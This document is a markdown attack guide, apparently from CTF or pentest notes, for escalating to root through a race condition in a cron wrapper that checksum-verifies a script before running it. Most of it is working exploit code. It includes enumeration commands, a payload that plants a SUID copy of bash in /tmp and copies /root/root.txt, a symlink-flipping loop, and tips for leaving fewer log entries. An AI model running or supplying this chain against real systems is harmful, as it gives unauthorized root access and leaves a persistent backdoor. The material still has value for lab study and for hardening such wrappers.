# TOCTOU on md5-Verified Cron Script via Symlink Atomic Flip

## When this applies

- A root-running cron / systemd timer / scheduled job executes a "verified" shell script — typically a wrapper that does `md5sum -c <script>.md5` (or `sha256sum -c`, GPG-verify, etc.) BEFORE executing the script with `bash <script>` / `sh <script>` / `<script>` (shebang).
- The user has write access to the **parent directory** of the target script (so they can `rename(2)` / replace via symlink) but NOT to the script file itself.
- Verification and execution open the path **independently** — there's a TOCTOU window between integrity check and execve.

The combination defeats md5/sha checksum guards on automation scripts that ran "safely" for years.

## Why it works

Bash (and most interpreters) opens the script path **twice**:
1. Once when the wrapper computes the hash (`md5sum -c`).
2. Once when the interpreter is exec'd against the path (`exec bash <path>` or shebang-driven `<path>`).

Between those two opens, the OS performs no integrity link between read #1 and exec #2. If the path is a symlink that you can atomically retarget via `rename(2)`, you race the window.

`rename(2)` on a symlink is atomic — there's no instant where the path resolves to "nothing". This makes the flip tighter than `unlink + symlink`.

## Steps

```bash
# Identification — find the wrapper
ps -eo pid,user,cmd | grep -E "cron|systemd-timer|secure-cron"
cat /etc/cron.d/* /etc/cron.{daily,hourly,d}/ /etc/crontab 2>/dev/null
systemctl list-timers --all

# Read the wrapper
cat /usr/local/bin/<wrapper>.sh
# Look for: md5sum -c <target>.md5  → exec/bash <target>
# Confirm: parent dir is writable to your group
ls -ld /<parent>/
groups  # is <writable_group> here?

# Plan the flip
# legit.sh = a known-good copy of the target (whose md5 matches)
# evil.sh  = your payload that runs as root
cp /<parent>/<target>.sh /tmp/legit.sh
cat > /tmp/evil.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
cat /root/root.txt > /tmp/.r
chmod 644 /tmp/.r
EOF
chmod +x /tmp/{legit,evil}.sh

# Replace the target with a symlink we own. Need a one-time write window —
# during a cron tick boundary, or via a brief perm slip.
# Simpler: if the parent dir is writable, mv/rm + ln during a "downbeat":
unlink /<parent>/<target>.sh
ln -sf /tmp/legit.sh /<parent>/<target>.sh

# Flip script — runs continuously, atomically retargets the symlink
cat > /tmp/flip.sh <<'EOF'
#!/bin/bash
while true; do
    ln -sfT /tmp/legit.sh /<parent>/<target>.sh   # legit -> passes md5
    ln -sfT /tmp/evil.sh  /<parent>/<target>.sh   # evil  -> runs as root
done
EOF
# `-T` (--no-target-directory) forces strict overwrite even when target exists

chmod +x /tmp/flip.sh
/tmp/flip.sh &
```

Within one cron tick, the wrapper's `md5sum -c` happens to read the legit-pointed symlink → passes integrity check → wrapper transitions to `bash <path>` which (microseconds later) resolves to the evil-pointed symlink → bash reads `/tmp/evil.sh` and runs it as root.

Stop the loop once you have the SUID shell:

```bash
kill %1
/tmp/rootbash -p     # SUID root shell
cat /tmp/.r          # or read /root/root.txt directly
```

## Tuning

- **Hit rate**: a tight `while true; ln -sfT …; ln -sfT …; done` loop typically yields 1-2 successful flips per minute on Linux 5.x. If the cron interval is short (every minute), one or two ticks is enough.
- **Single-flip variants** (if `while true` busy-loops are noisy): use `inotifywait` on the parent dir or the wrapper's PID to detect the wrapper opening the path, then flip. More precise, fewer log entries.
- **GPG-verify variants**: same pattern. Signature is verified against one read; bash exec's against another.

## Alternative when the parent dir is NOT writable

- **bind mount over the path** (requires `CAP_SYS_ADMIN`, rare for low-priv users).
- **fanotify FAN_OPEN_PERM** to intercept open and substitute content (requires root, irrelevant for foothold).
- **Hardlink farming**: if the wrapper does `cat <script>.md5 | md5sum -c` and the .md5 contains relative paths, hardlink the script's md5 file to your own crafted version. Less common.

## Verifying success

- `/tmp/rootbash` exists and is `4755 root root`.
- `id` inside `/tmp/rootbash -p` reports `uid=<u> euid=0(root)`.
- The cron tick's syslog entries show the script ran successfully (`Started <Unit>`, no md5-mismatch error).

## Common pitfalls

- `ln -sf` without `-T` doesn't overwrite when the target is a directory or sometimes when the symlink already exists; use `-fT` or `unlink && ln -s`. The race window collapses without atomic semantics.
- bash with `BASH_ENV=` or `ENV=` in the wrapper's environment changes the order of file opens. Read the wrapper carefully.
- Some wrappers `cp <script> /tmp/.cache.$$ ; md5 /tmp/.cache.$$ ; bash /tmp/.cache.$$` — copy then check then exec. The race is now on the copy step, not on the symlink — exploit by replacing the symlink between copy and md5.
- `sha256sum -c` is slower (more CPU work between read #1 and read #2) — the race window is actually WIDER than md5.

## Tools

- `inotifywait` (precise timing)
- `ln -sfT` (atomic symlink replace)
- `pspy64` (cron interval discovery)
- `auditctl` / `strace` (verify the wrapper's open() pattern)
